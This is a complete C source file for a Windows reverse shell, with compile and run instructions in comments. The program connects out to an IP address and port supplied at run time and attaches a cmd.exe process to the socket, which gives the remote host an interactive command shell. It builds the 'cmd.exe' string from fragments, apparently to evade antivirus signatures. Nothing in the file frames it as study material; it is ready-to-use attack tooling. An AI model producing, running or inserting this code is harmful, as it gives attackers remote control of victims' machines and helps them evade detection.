/* compile: i686-w64-mingw32-gcc -o rev.exe reverse.c -lws2_32 */
/* EXECUTE: rev.exe [IP] [PORT] */

#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "w2_32")

WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;
char aip_addr[16];
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;
  

int main(int argc, char *argv[]) 
{
	WSAStartup(MAKEWORD(2,2), &wsaData);
	Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
    
    	if (argv[1] == NULL){
		exit(1);
	}

    	struct hostent *host;
	host = gethostbyname(argv[1]);
	strcpy(aip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
    
	hax.sin_family = AF_INET;
	hax.sin_port = htons(atoi(argv[2]));
	hax.sin_addr.s_addr =inet_addr(aip_addr);
    
	WSAConnect(Winsock,(SOCKADDR*)&hax, sizeof(hax),NULL,NULL,NULL,NULL);
	if (WSAGetLastError() == 0) {

		memset(&ini_processo, 0, sizeof(ini_processo));

		ini_processo.cb=sizeof(ini_processo);
		ini_processo.dwFlags=STARTF_USESTDHANDLES;
		ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

		char *myArray[4] = { "cm", "d.e", "x", "e" };
		char command[8] = "";
		snprintf( command, sizeof(command), "%s%s%s%s", myArray[0], myArray[1], myArray[2], myArray[3]);

		CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
		exit(0);
	} else {
		exit(0);
	}    
}
